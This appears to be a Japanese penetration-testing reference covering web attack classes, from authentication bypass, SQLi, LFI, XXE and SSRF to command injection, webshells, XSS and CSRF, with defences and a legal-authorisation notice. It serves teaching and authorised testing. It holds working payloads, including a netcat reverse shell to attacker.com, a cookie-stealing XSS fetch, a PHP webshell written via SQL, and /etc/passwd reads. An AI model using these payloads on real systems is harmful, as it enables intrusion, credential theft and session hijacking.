# Webアプリケーション攻撃手法リファレンス

Webペネトレーションテストで悪用されやすい代表的な脆弱性と攻撃シナリオの組み立て方をまとめたリファレンスドキュメント。

---

## 概要

Webアプリケーションに対する攻撃は以下のカテゴリに分類される:

1. **認証の突破** - ログイン機能の不備を利用する攻撃
2. **認可制御の不備** - 権限昇格や他ユーザ情報の不正アクセス
3. **外部・内部リソース参照機能の悪用** - SQLi、LFI、XXE、SSRF
4. **サーバへの侵入** - OSコマンドインジェクション、デシリアライゼーション
5. **クライアントへの攻撃** - XSS、CSRF
6. **既知の脆弱性調査** - CVE、Exploit-DBの活用

---

## 1. 認証の突破

### 1.1 漏洩パスワードの利用

| 項目 | 内容 |
|------|------|
| 攻撃手法 | 別サービスで漏洩した認証情報を用いてログイン |
| 攻撃目的 | ユーザアカウントへの不正ログイン |
| 特徴 | パスワード使い回しが前提 |

#### 漏洩認証情報データベース

- **LeakCheck**: 大規模漏洩情報の検索サービス
- **Intelligence X**: ドメイン名・メールアドレスでの漏洩情報照会
- **調査対象**: 企業ドメイン、従業員メールアドレス、管理者アカウント(admin, root等)

#### テスト実施時の注意

- クライアントとの事前合意を書面で確立
- テスト対象範囲を企業管理ドメインに限定
- 実際のログイン試行は個別許諾を取得
- 顧問弁護士との適法性確認を推奨

### 1.2 パスワードリスト攻撃

| 項目 | 内容 |
|------|------|
| 攻撃手法 | よく利用されるパスワードを入力 |
| 攻撃目的 | ユーザアカウントへの不正ログイン |
| 特徴 | 大量試行で攻撃検知される可能性大 |

#### 主要なパスワードリスト

- **RockYou**: 2009年のSNS漏洩データ基盤（RockYou2021/2024など更新版あり）
- **SecLists**: パスワード・ディレクトリ・ファジング等の包括的コレクション

#### 攻撃ツール

- **Hydra**: HTTP/SSH/FTP等の多様なプロトコル対応
- **Burp Suite Intruder**: HTTPリクエストの任意パラメータをペイロード置換
- **カスタムスクリプト**: 独自の認証フローに対応

#### 注意事項

- アカウントロックアウトの可能性を考慮
- 試行回数上限とロックアウトポリシーを事前確認
- 試行間隔を調整してブロック回避

### 1.3 パスワードリセット機能の悪用

| 項目 | 内容 |
|------|------|
| 攻撃手法 | トークン総当たり、メール送信先改ざん等 |
| 攻撃目的 | 他ユーザアカウントの乗っ取り |
| 特徴 | 独自実装で発生しやすい |

#### 攻撃パターン1: メール送信先改ざん

**Unicode正規化の悪用**

- データベースの照合順序（例: utf8mb4_general_ci）が特定Unicode文字を等価扱い
- トルコ語の「ı」(U+0131)と通常の「i」(U+0069)が等価判定される
- メール送信先をDB検索値でなく入力値そのまま使用する実装の不備

**攻撃手順**:
1. 標的メールアドレス決定（target@victim.example）
2. Unicode等価文字を使った類似ドメイン取得（target@vıctim.example）
3. パスワードリセットフォームに類似メールアドレス入力
4. 正規アカウント用トークンが攻撃者メールアドレスに送信される

**成立条件**:
- 照合順序が等価文字を認識
- 標的メールに等価文字が含まれる
- 類似ドメインを攻撃者が取得可能
- IDN対応のメール送信システム

#### 攻撃パターン2: トークン検証処理の不備

**a) エントロピー不足と試行回数制限の不備**

- 数字6桁トークン = 100万通りのみ
- リセット要求を繰り返すことで試行回数上限を回避
- 1000回試行×1000サイクル = 約63%の成功確率

**対策**:
- CSPRNG（暗号論的擬似乱数生成器）で16バイト以上生成
- トークン有効期間を短く設定（15分〜1時間）
- 試行回数制限（3〜5回）

**b) ユーザ特定情報の改ざん**

- 隠しフィールドやURLパラメータでユーザIDを管理
- リクエスト改ざんで他ユーザのパスワードを変更可能

**c) 型比較の脆弱性**

- MySQLの暗黙的型変換を悪用
- トークン="abcd1234"に対し、数値0を送信
- WHERE token = 0が「先頭が数字でない文字列=0」として評価

---

## 2. 認可制御の不備

### 2.1 分類

| 種別 | 説明 | 例 |
|------|------|-----|
| 縦型 | 上位権限ユーザ機能の利用 | 一般ユーザが/admin/dashboardにアクセス |
| 横型 | 他ユーザ情報の閲覧・改ざん | ユーザ1が/users/2にアクセス |

### 2.2 横型IDOR（Insecure Direct Object Reference）

**典型的な攻撃**:
- URLパラメータ改ざん: `/users/123` → `/users/124`
- ファイルパス改ざん: `download?file=invoice_123.pdf` → `invoice_124.pdf`
- API IDパラメータ改ざん: `{"order_id": 1001}` → `{"order_id": 1002}`

**検出方法**:
1. リソースIDを含むエンドポイントを特定
2. 複数アカウントでID値を収集
3. 他ユーザのIDでアクセス試行
4. レスポンス差分を確認（200 vs 403/404）

### 2.3 縦型権限昇格

**攻撃パターン**:
- 管理機能URLへの直接アクセス
- ロールパラメータ改ざん: `{"role": "user"}` → `{"role": "admin"}`
- 権限チェック前のAPIエンドポイント呼び出し

---

## 3. 外部・内部リソース参照機能の悪用

### 3.1 SQLインジェクション

| 項目 | 内容 |
|------|------|
| 攻撃手法 | SQL文に悪意ある入力を挿入 |
| 攻撃目的 | データベース情報の窃取・改ざん |
| 特徴 | 最も深刻な脆弱性の一つ |

#### 攻撃タイプ

**a) Union-based SQLi**

脆弱なクエリ例:
```
SELECT * FROM products WHERE id = [ユーザ入力]
```

攻撃ペイロード:
```
1 UNION SELECT username, password, NULL FROM users--
```

**b) Blind Boolean-based SQLi**

真偽判定でデータ推測:
```
?id=1 AND 1=1  -- True（正常レスポンス）
?id=1 AND 1=0  -- False（異常レスポンス）

-- パスワード1文字目推測
?id=1 AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'
```

**c) Blind Time-based SQLi**

時間遅延でデータ推測:
```
-- MySQL
?id=1 AND SLEEP(5)--

-- PostgreSQL
?id=1 AND pg_sleep(5)--
```

#### SQLMap活用

```bash
# 基本スキャン
sqlmap -u "http://target.com/item?id=1" --batch

# データベース列挙
sqlmap -u "http://target.com/item?id=1" --dbs

# テーブルダンプ
sqlmap -u "http://target.com/item?id=1" -D database_name --dump
```

### 3.2 ローカルファイルインクルージョン（LFI）/ パストラバーサル

| 項目 | 内容 |
|------|------|
| 攻撃手法 | ディレクトリトラバーサルでファイル参照 |
| 攻撃目的 | サーバ上の任意ファイル読み取り |
| 特徴 | ファイル参照機能で発生 |

#### 典型的なペイロード

```
../../../etc/passwd
....//....//....//etc/passwd  （フィルタ回避）
..%2F..%2F..%2Fetc%2Fpasswd  （URLエンコード）
```

#### 絶対パス悪用

Python `os.path.join()`の挙動:
```python
os.path.join('/app/images/', '/etc/passwd')
# 結果: '/etc/passwd'（第一引数が無視される）
```

.NET `Path.Combine()`の挙動:
```
Path.Combine(@"D:\public", @"C:\secret")
// 結果: C:\secret（Windowsでドライブレター優先）
```

#### SQLインジェクション経由のファイルアクセス

MySQLでのファイル読み取り:
```sql
SELECT load_file('/etc/passwd')
```

ファイル書き込み:
```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php'
```

**制約**:
- FILE権限必要
- secure_file_priv設定による制限
- ファイルサイズがmax_allowed_packet未満

#### シンボリックリンクを含むZIPファイル

/etc/passwdへのsymlinkを含むZIP作成:
```bash
ln -s /etc/passwd settings.json
zip -y malicious.zip settings.json
```

アップロード後、settings.jsonが/etc/passwdを参照する。

### 3.3 XXE（XML External Entity）攻撃

| 項目 | 内容 |
|------|------|
| 攻撃手法 | 外部エンティティを参照するXMLを送信 |
| 攻撃目的 | サーバ上の機密ファイル読み出し、SSRF |
| 特徴 | XML処理過程で発生 |

#### 基本的なペイロード

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

#### 影響範囲

- **ローカルファイル窃取**: レスポンスに含まれる
- **SSRF**: http://スキームで内部ネットワークへリクエスト
- **DoS**: 特定ペイロードでリソース枯渇

#### 対策状況

- Python lxml 5.0以降: デフォルトで外部エンティティ無効化
- Java標準API（javax.xml.parsers）: 依然としてデフォルトで有効

#### 残存リスク領域

- **SAML認証**: XMLメッセージ交換
- **オフィス文書・SVG**: XML基盤フォーマット
- **レガシーシステム連携**

### 3.4 SSRF（Server-Side Request Forgery）

| 項目 | 内容 |
|------|------|
| 攻撃手法 | 内部ネットワークURLを送信 |
| 攻撃目的 | 内部システムへの不正アクセス |
| 特徴 | 外部サービス連携機能で発生しやすい |

#### 典型的な脆弱実装

```python
@app.route("/fetch")
def fetch():
    target_url = request.args.get('url')
    res = requests.get(target_url)  # 検証なし
    return res.text
```

#### 攻撃シナリオ

**a) クラウドメタデータサービスへのアクセス**

AWS IMDSv1:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

IMDSv2（トークン必須で防御）:
```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

**b) 内部ネットワークリソースへのアクセス**

```
http://192.168.1.1/admin
http://localhost:8080/internal-api
http://10.0.0.5/metrics
```

**c) プロトコルスキーム悪用**

```
file:///etc/passwd
dict://attacker:11111/info
gopher://internal-server:70/xGET%20/admin
```

---

## 4. サーバへの侵入

### 4.1 OSコマンドインジェクション

| 項目 | 内容 |
|------|------|
| 攻撃手法 | シェルコマンドの挿入 |
| 攻撃目的 | サーバ上での任意コード実行 |
| 特徴 | シェル呼び出し関数の不適切な使用 |

#### 典型的な脆弱パターン

Pythonの例:
```python
import os
filename = request.args.get('file')
os.system(f"cat {filename}")  # 危険
```

攻撃ペイロード:
```
?file=test.txt; whoami
?file=test.txt | nc attacker.com 4444 -e /bin/bash  # リバースシェル
```

#### 対策

- シェル呼び出しを避ける（subprocess.run()でshell=False）
- 入力値の厳密なバリデーション
- ホワイトリスト方式の実装

### 4.2 安全でないデシリアライゼーション

| 項目 | 内容 |
|------|------|
| 攻撃手法 | 悪意あるシリアライズデータを送信 |
| 攻撃目的 | 任意コード実行 |
| 特徴 | Java/PHP/Pythonで発生 |

#### 言語別リスク

**Java**:
- ObjectInputStreamでの任意オブジェクトデシリアライズ
- ysoserial等のツールでペイロード生成

**PHP**:
- unserialize()関数の悪用
- __wakeup()/__destruct()マジックメソッド悪用

**Python**:
- pickle.loads()の危険性
- __reduce__メソッド悪用

### 4.3 Webシェルの設置（ファイルアップロード悪用）

| 項目 | 内容 |
|------|------|
| 攻撃手法 | 実行可能ファイルのアップロード |
| 攻撃目的 | 永続的なバックドア設置 |
| 特徴 | ファイルアップロード機能の不備 |

#### 攻撃手順

1. **拡張子チェック回避**
   - `.php.jpg` / `.phtml` / `.php5`
   - Content-Type偽装
   - ダブルエクステンション

2. **WebShellアップロード例**（PHP）

3. **アクセスと実行**
```
http://target.com/uploads/shell.php?cmd=whoami
```

---

## 5. クライアントへの攻撃

### 5.1 XSS（Cross-Site Scripting）

| 項目 | 内容 |
|------|------|
| 攻撃手法 | 悪意あるスクリプトの挿入 |
| 攻撃目的 | ユーザセッション乗っ取り、情報窃取 |
| 特徴 | 入力値の不適切なエスケープ |

#### タイプ別分類

**a) Reflected XSS（反射型）**

脆弱な実装:
```
検索結果: [ユーザ入力をそのまま表示]
```

攻撃URL例:
```
?q=<script>alert(document.cookie)</script>
```

**b) Stored XSS（蓄積型）**

コメント投稿機能への攻撃:
```json
POST /comment
{
  "text": "<img src=x onerror='fetch(\"http://attacker.com?c=\"+document.cookie)'>"
}
```

**c) DOM-based XSS**

脆弱なJavaScript:
```javascript
const name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = "Hello " + name;
```

攻撃URL:
```
http://target.com/#<img src=x onerror=alert(1)>
```

### 5.2 CSRF（Cross-Site Request Forgery）

| 項目 | 内容 |
|------|------|
| 攻撃手法 | 被害者ブラウザから強制的にリクエスト送信 |
| 攻撃目的 | ユーザ権限での不正操作 |
| 特徴 | CSRFトークン未実装で発生 |

#### 攻撃例

攻撃者サイトに設置するHTML:
```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

---

## 6. 既知の脆弱性調査

### 6.1 脆弱性データベース

| データベース | 内容 |
|------------|------|
| **CVE** | 共通脆弱性識別子 |
| **NVD** | 米国国立脆弱性データベース |
| **JVN** | 日本脆弱性情報データベース |

### 6.2 Exploitコード調査

| リソース | 特徴 |
|---------|------|
| **Exploit-DB** | 実証コード最大級のデータベース |
| **GitHub** | POC検索（"CVE-XXXX-YYYY poc"） |
| **Nuclei** | YAML形式の脆弱性検出テンプレート |

### 6.3 調査手順

1. **バージョン情報収集**
   - HTTPヘッダ（Server, X-Powered-By）
   - エラーメッセージ
   - JavaScript/CSSファイル内のバージョン情報

2. **脆弱性検索**
   ```bash
   # searchsploit
   searchsploit wordpress 5.8

   # Nuclei
   nuclei -u https://target.com -t cves/
   ```

3. **Exploit検証**
   - 概念実証コードの動作確認
   - 本番環境への影響を最小化

---

## 7. 攻撃シナリオの組み立て

### 7.1 MITRE ATT&CKフレームワーク（Web向け6戦術）

| 戦術 | 技術例 |
|------|--------|
| **Reconnaissance（偵察）** | OSINT、ドメイン列挙、ポートスキャン |
| **Initial Access（初期アクセス）** | SQLi、XSS、デフォルト認証情報 |
| **Execution（実行）** | OSコマンドインジェクション、Webシェル |
| **Credential Access（認証情報アクセス）** | パスワードリスト攻撃、セッション窃取 |
| **Lateral Movement（横展開）** | SSRF経由の内部ネットワーク侵入 |
| **Exfiltration（情報窃取）** | SQLiでのデータダンプ、ファイルダウンロード |

### 7.2 攻撃チェイン例

```
1. 偵察
   ↓ サブドメイン列挙、技術スタック特定
2. 初期アクセス
   ↓ SQLインジェクション脆弱性発見
3. 認証情報窃取
   ↓ usersテーブルからハッシュ取得
4. 権限昇格
   ↓ 管理者パスワード解析成功
5. 横展開
   ↓ 管理機能経由でSSRF実行
6. 情報窃取
   ↓ 内部APIから顧客データ取得
```

### 7.3 リスク評価マトリクス

| 技術的影響 / ビジネス影響 | 低 | 中 | 高 |
|------------------------|-----|-----|-----|
| **高**（RCE、SQLi） | 中 | 高 | 致命的 |
| **中**（XSS、IDOR） | 低 | 中 | 高 |
| **低**（情報漏洩） | 低 | 低 | 中 |

---

## 8. 防御側への示唆

| 攻撃手法 | 主要な防御策 |
|---------|------------|
| SQLインジェクション | プリペアドステートメント、ORM使用 |
| XSS | 出力エスケープ、Content-Security-Policy |
| CSRF | CSRFトークン、SameSite Cookie |
| パストラバーサル | 入力値のサニタイズ、ホワイトリスト |
| SSRF | URLホワイトリスト、内部ネットワーク分離 |
| OSコマンドインジェクション | シェル呼び出し回避、入力検証 |
| デシリアライゼーション | 信頼できないデータのデシリアライズ禁止 |
| XXE | 外部エンティティ参照の無効化 |
| 認証突破 | 多要素認証、レートリミット |
| 権限昇格 | 最小権限原則、認可チェックの徹底 |

---

**注**: このリファレンスは一般的なセキュリティベストプラクティスとして記述されている。実際のペネトレーションテストは必ず正式な契約と許可の下で実施すること。
